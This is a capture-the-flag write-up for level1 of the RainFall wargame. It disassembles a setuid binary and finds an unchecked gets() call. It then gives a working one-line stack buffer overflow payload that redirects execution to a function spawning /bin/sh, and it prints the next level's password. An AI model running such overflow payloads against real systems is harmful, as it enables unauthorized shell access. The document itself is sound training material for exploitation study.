# Level 1

## Hint

"Man gets" :)

## Answer

First, let's analyze what we have:

```bash
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
level1@RainFall:~$ ./level1
42
```

We have a simple program that takes input and appears to do nothing significant.

Next, let's use objdump to inspect the program's assembly code:

```bash
level1@RainFall:~$ objdump -d level1
[...]
08048340 <gets@plt>:
 8048340:       ff 25 98 97 04 08       jmp    *0x8049798
 8048346:       68 00 00 00 00          push   $0x0
 804834b:       e9 e0 ff ff ff          jmp    8048330 <_init+0x38>      
[...]
08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00 
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00 
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave  
 804847f:       c3                      ret    

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave  
 8048496:       c3                      ret    
 8048497:       90                      nop
 8048498:       90                      nop
 8048499:       90                      nop
 804849a:       90                      nop
 804849b:       90                      nop
 804849c:       90                      nop
 804849d:       90                      nop
 804849e:       90                      nop
 804849f:       90                      nop
[...]
```
```bash
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

In the disassembled code, we find two main functions: `run` and `main`. The `run` function calls `fwrite` and `system`, with the latter using "/bin/sh" as an argument.

Now, let's focus on the `main` function. It reads input using the `gets` function and then returns. The `gets` function is known to be unsafe, as it can lead to buffer overflow vulnerabilities.

```bash
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
```

In this case, the program's stack has a size of 80 bytes, starting at 0x10 (16). Therefore, the buffer is 64 bytes long. Since the `gets` function is followed by the `run` function, we can exploit a stack buffer overflow.

To do this, we need to overwrite the return address (64 + 12) with the address of the `run` function, effectively redirecting program execution to it. This technique is known as a "Stack Buffer Overflow."

Let's execute the attack:

```bash
level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
```

The program now executes the `run` function, which calls `/bin/sh`, and we gain shell access. We can then read the password for the next level:

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit
```

However, the program eventually crashes with a segmentation fault because the return address was tampered with.
